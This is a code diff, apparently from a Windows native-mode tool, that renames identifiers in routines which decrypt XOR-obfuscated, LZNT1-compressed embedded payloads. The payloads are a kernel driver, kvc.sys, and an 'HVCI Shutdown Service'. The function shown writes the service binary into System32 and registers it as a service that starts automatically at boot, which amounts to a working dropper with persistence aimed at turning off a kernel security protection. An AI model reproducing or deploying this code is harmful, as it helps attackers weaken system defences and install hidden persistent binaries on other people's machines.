@@ -30,15 +30,15 @@ extern PWSTR MmGetPoolDiagnosticString(void);
 
 // Resource IDs for embedded payloads (RCDATA, type 10).
 #define IDR_DRV1                 101   // kvc.sys kernel driver
-#define IDR_DRV2                 102   // bbs.exe HVCI Shutdown Service
+#define IDR_DRV2                 102   // HvciShutdownSvc.exe HVCI Shutdown Service
 // Exact size of the XOR+LZNT1-compressed payload stored in the resource section.
 #define kvc_SIZE              9139
 // Exact size of kvc.sys after LZNT1 decompression — used to validate integrity.
 #define kvc_UNCOMPRESSED_SIZE 14024
-// Compressed size of bbs.exe (XOR+LZNT1) — deterministic, rebuild if binary changes.
-#define bbs_SIZE              1759
-// Uncompressed size of bbs.exe — used to validate decompression integrity.
-#define bbs_UNCOMPRESSED_SIZE 4096
+// Compressed size of HvciShutdownSvc.exe (XOR+LZNT1) — deterministic, rebuild if binary changes.
+#define HvciShutdownSvc_SIZE              1759
+// Uncompressed size of HvciShutdownSvc.exe — used to validate decompression integrity.
+#define HvciShutdownSvc_UNCOMPRESSED_SIZE 4096
 
 // 1 MB chunk size is optimal for Native I/O operations.
 #define SCAN_CHUNK_SIZE (1024 * 1024)
@@ -256,16 +256,16 @@ BOOLEAN ExtractkvcFromResource(void) {
 }
 
 // ============================================================================
-// BBS SERVICE DEPLOYMENT
-// Extracts bbs.exe from resource IDR_DRV2 and registers HVCIShutdownSvc so
+// HvciShutdownSvc SERVICE DEPLOYMENT
+// Extracts HvciShutdownSvc.exe from resource IDR_DRV2 and registers HVCIShutdownSvc so
 // that the SCM starts it automatically on next and every subsequent boot.
 //
 // Deployment pipeline (build time):
-//   raw bbs.exe -> LZNT1 compress -> XOR with XOR_KEY -> IDR_DRV2 resource
+//   raw HvciShutdownSvc.exe -> LZNT1 compress -> XOR with XOR_KEY -> IDR_DRV2 resource
 //
 // Extraction pipeline (runtime, here):
 //   FindResourceData(IDR_DRV2) -> XOR decrypt -> RtlDecompressBuffer(LZNT1)
-//   -> NtCreateFile to \SystemRoot\System32\bbs.exe
+//   -> NtCreateFile to \SystemRoot\System32\HvciShutdownSvc.exe
 //   -> NtCreateKey  \Registry\Machine\...\Services\HVCIShutdownSvc
 //
 // The function is idempotent: the file is opened with FILE_OVERWRITE_IF and
@@ -273,56 +273,56 @@ BOOLEAN ExtractkvcFromResource(void) {
 // ============================================================================
 
 // Destination path for the extracted service binary.
-#define bbs_DestPath  L"\\SystemRoot\\System32\\bbs.exe"
+#define HvciShutdownSvc_DestPath  L"\\SystemRoot\\System32\\HvciShutdownSvc.exe"
 // ImagePath value stored in the service key (REG_EXPAND_SZ, SCM-expanded).
-#define bbs_ImagePath L"%SystemRoot%\\System32\\bbs.exe"
+#define HvciShutdownSvc_ImagePath L"%SystemRoot%\\System32\\HvciShutdownSvc.exe"
 // Human-readable name stored in the service key.
-#define bbs_DisplayName L"HVCI Shutdown Service"
-// SCM service name (must match the name compiled into bbs.exe).
-#define bbs_ServiceName L"HVCIShutdownSvc"
+#define HvciShutdownSvc_DisplayName L"HVCI Shutdown Service"
+// SCM service name (must match the name compiled into HvciShutdownSvc.exe).
+#define HvciShutdownSvc_ServiceName L"HVCIShutdownSvc"
 
-BOOLEAN ExtractBbsAndRegisterService(void) {
+BOOLEAN ExtractHvciShutdownSvcAndRegisterService(void) {
     ULONG resourceSize = 0;
     PVOID resourceData = FindResourceData(IDR_DRV2, &resourceSize);
 
-    if (!resourceData || resourceSize != bbs_SIZE) {
-        DisplayMessage(L"FAILED: Cannot find bbs.exe resource (IDR_DRV2)\r\n");
+    if (!resourceData || resourceSize != HvciShutdownSvc_SIZE) {
+        DisplayMessage(L"FAILED: Cannot find HvciShutdownSvc.exe resource (IDR_DRV2)\r\n");
         return FALSE;
     }
 
-    DEBUG_LOG(L"INFO: Extracting bbs.exe from resource IDR_DRV2...\r\n");
+    DEBUG_LOG(L"INFO: Extracting HvciShutdownSvc.exe from resource IDR_DRV2...\r\n");
 
-    UCHAR xorBuf[bbs_SIZE];
-    UCHAR decompBuf[bbs_UNCOMPRESSED_SIZE];
+    UCHAR xorBuf[HvciShutdownSvc_SIZE];
+    UCHAR decompBuf[HvciShutdownSvc_UNCOMPRESSED_SIZE];
     ULONG finalSize = 0;
     NTSTATUS status;
 
     // XOR decrypt (same key as IDR_DRV1)
     UCHAR* srcData = (UCHAR*)resourceData;
-    for (SIZE_T i = 0; i < bbs_SIZE; i++) {
+    for (SIZE_T i = 0; i < HvciShutdownSvc_SIZE; i++) {
         xorBuf[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
     }
 
     // LZNT1 decompress
     status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
-                                 decompBuf, bbs_UNCOMPRESSED_SIZE,
-                                 xorBuf, bbs_SIZE,
+                                 decompBuf, HvciShutdownSvc_UNCOMPRESSED_SIZE,
+                                 xorBuf, HvciShutdownSvc_SIZE,
                                  &finalSize);
 
-    if (!NT_SUCCESS(status) || finalSize != bbs_UNCOMPRESSED_SIZE) {
-        DisplayMessage(L"FAILED: Cannot decompress bbs.exe resource");
+    if (!NT_SUCCESS(status) || finalSize != HvciShutdownSvc_UNCOMPRESSED_SIZE) {
+        DisplayMessage(L"FAILED: Cannot decompress HvciShutdownSvc.exe resource");
         DisplayStatus(status);
         return FALSE;
     }
 
-    // Write bbs.exe to System32
+    // Write HvciShutdownSvc.exe to System32
     UNICODE_STRING usFilePath;
     OBJECT_ATTRIBUTES oa;
     IO_STATUS_BLOCK iosb;
     HANDLE hFile;
     LARGE_INTEGER byteOffset;
 
-    RtlInitUnicodeString(&usFilePath, bbs_DestPath);
+    RtlInitUnicodeString(&usFilePath, HvciShutdownSvc_DestPath);
     InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
@@ -330,23 +330,23 @@ BOOLEAN ExtractBbsAndRegisterService(void) {
                          FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
     if (!NT_SUCCESS(status)) {
-        DisplayMessage(L"FAILED: Cannot create System32\\bbs.exe");
+        DisplayMessage(L"FAILED: Cannot create System32\\HvciShutdownSvc.exe");
         DisplayStatus(status);
         return FALSE;
     }
 
     byteOffset.QuadPart = 0;
     status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decompBuf,
-                        bbs_UNCOMPRESSED_SIZE, &byteOffset, NULL);
+                        HvciShutdownSvc_UNCOMPRESSED_SIZE, &byteOffset, NULL);
     NtClose(hFile);
 
     if (!NT_SUCCESS(status)) {
-        DisplayMessage(L"FAILED: Cannot write System32\\bbs.exe");
+        DisplayMessage(L"FAILED: Cannot write System32\\HvciShutdownSvc.exe");
         DisplayStatus(status);
         return FALSE;
     }
 
-    DEBUG_LOG(L"SUCCESS: bbs.exe extracted to System32\r\n");
+    DEBUG_LOG(L"SUCCESS: HvciShutdownSvc.exe extracted to System32\r\n");
 
     // Create SCM service registry key for HVCIShutdownSvc
     // Type  = 0x10  SERVICE_WIN32_OWN_PROCESS
@@ -363,11 +363,11 @@ BOOLEAN ExtractBbsAndRegisterService(void) {
     if (wcscpy_safe(svcKeyPath, MAX_PATH_LEN,
                     L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\")
         >= MAX_PATH_LEN - 1) {
-        DisplayMessage(L"WARNING: bbs service key path too long\r\n");
+        DisplayMessage(L"WARNING: HvciShutdownSvc service key path too long\r\n");
         return TRUE;  // file was written successfully; key failure is non-fatal
     }
-    if (wcscat_safe(svcKeyPath, MAX_PATH_LEN, bbs_ServiceName) >= MAX_PATH_LEN) {
-        DisplayMessage(L"WARNING: bbs service key path truncated\r\n");
+    if (wcscat_safe(svcKeyPath, MAX_PATH_LEN, HvciShutdownSvc_ServiceName) >= MAX_PATH_LEN) {
+        DisplayMessage(L"WARNING: HvciShutdownSvc service key path truncated\r\n");
         return TRUE;
     }
 
@@ -387,13 +387,13 @@ BOOLEAN ExtractBbsAndRegisterService(void) {
 
     // ImagePath — REG_EXPAND_SZ — SCM expands %SystemRoot% at start time
     RtlInitUnicodeString(&usValueName, L"ImagePath");
-    dataSize = (ULONG)((wcslen(bbs_ImagePath) + 1) * sizeof(WCHAR));
-    NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, (PVOID)bbs_ImagePath, dataSize);
+    dataSize = (ULONG)((wcslen(HvciShutdownSvc_ImagePath) + 1) * sizeof(WCHAR));
+    NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, (PVOID)HvciShutdownSvc_ImagePath, dataSize);
 	
 	// DisplayName — REG_SZ
     RtlInitUnicodeString(&usValueName, L"DisplayName");
-    dataSize = (ULONG)((wcslen(bbs_DisplayName) + 1) * sizeof(WCHAR));
-    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)bbs_DisplayName, dataSize);
+    dataSize = (ULONG)((wcslen(HvciShutdownSvc_DisplayName) + 1) * sizeof(WCHAR));
+    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)HvciShutdownSvc_DisplayName, dataSize);
 
     // ObjectName — REG_SZ
     RtlInitUnicodeString(&usValueName, L"ObjectName");
